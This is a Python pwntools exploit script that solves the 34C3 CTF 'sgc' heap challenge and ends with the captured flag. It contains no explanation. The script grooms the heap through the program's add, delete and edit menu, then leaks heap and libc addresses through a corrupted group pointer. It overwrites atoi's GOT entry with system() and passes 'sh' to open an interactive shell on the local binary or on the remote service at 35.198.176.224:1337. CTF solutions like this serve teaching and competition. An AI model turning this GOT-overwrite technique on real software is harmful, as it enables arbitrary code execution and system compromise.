from pwn import *
import time
LOCAL = 1
VERBOSE = 1
DEBUG = 0
context.arch = 'amd64'
if VERBOSE:
    context.log_level = 'debug'
if LOCAL:
    io = process('./sgc')
    libc = ELF('./sgc_libc-2.26.so')
    if DEBUG:
        gdb.attach(io)
else:
    io = remote('35.198.176.224', 1337)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
def add_user(name, group, age):
    io.recvuntil('Action: ')
    io.sendline('0')
    io.recvuntil('Please enter the user\'s name: ')
    io.send(name)
    io.recvuntil('Please enter the user\'s group: ')
    io.send(group)
    io.recvuntil('Please enter your age: ')
    io.sendline(str(age))
def display_user(index):
    io.recvuntil('Action: ')
    io.sendline('2')
    io.recvuntil('Enter index: ')    
    io.sendline(str(index))
def edit_group(index, group, is_propagate):
    io.recvuntil('Action: ')
    io.sendline('3')
    io.recvuntil('Enter index: ')    
    io.sendline(str(index))
    io.recvuntil('group(y/n): ')
    io.sendline(is_propagate)
    io.recvuntil('Enter new group name: ')
    io.send(group)
def del_user(index):
    io.recvuntil('Action: ')
    io.sendline('4')
    io.recvuntil('Enter index: ')    
    io.sendline(str(index))
elf = ELF('./sgc')
add_user('1111\n', 'AAAA\n', 1)
del_user(0)
time.sleep(1)
add_user('2222\n', 'BBBB\n', 2)
del_user(0)
time.sleep(1)
add_user('3333\n', 'CCCC\n', 3)
del_user(0)
time.sleep(1)
add_user('4444\n', 'DDDD\n', 4)
del_user(0)
time.sleep(1)
for i in range(20):
    add_user('5555\n', 'EEEE\n', i)
for i in range(20):
    del_user(i)
    time.sleep(1)
add_user('6666\n', 'FFFF\n', 0x60)
add_user('7777\n', 'GGGG\n', 0x61)
add_user('8888\n', 'HHHH\n', 0xd0)
edit_group(1, 'FFFF\n', 'y')
del_user(1)
time.sleep(1)
heap_offset = 0xc0
display_user(0)
io.recvuntil('Group: ')
leak_heap_addr = u64(io.recvuntil('\n')[:-1].ljust(8, '\x00'))
user3_heap_addr = leak_heap_addr + heap_offset
log.info('leak_heap_addr:%#x' % leak_heap_addr)
log.info('user3_heap_addr:%#x' % user3_heap_addr)
edit_group(0, p64(user3_heap_addr) + '\n', 'y')
edit_group(2, 'IIII\n', 'n')
edit_group(2, '\x00\x00\x00\x00\n', 'n')
edit_group(2, 'KKKK\n', 'n')
add_user('4444\n', p64(0) + p64(elf.got['atoi']) * 2, 4)
display_user(2)
io.recvuntil('Group: ')
free_addr = u64(io.recvuntil('\n')[:-1].ljust(8, '\x00'))
libc_addr = free_addr - libc.symbols['atoi']
system_addr = libc_addr + libc.symbols['system']
log.info('libc_addr:%#x' % libc_addr)
log.info('system_addr:%#x' % system_addr)
edit_group(2, p64(system_addr)[:6] + '\n', 'y')
io.recvuntil('Action: ')
io.sendline('2')
io.recvuntil('Enter index: ')
io.sendline('sh\x00')
io.interactive()
# 34C3_th4t_garb4ge_c0llect0r_w4s_garbage_heh
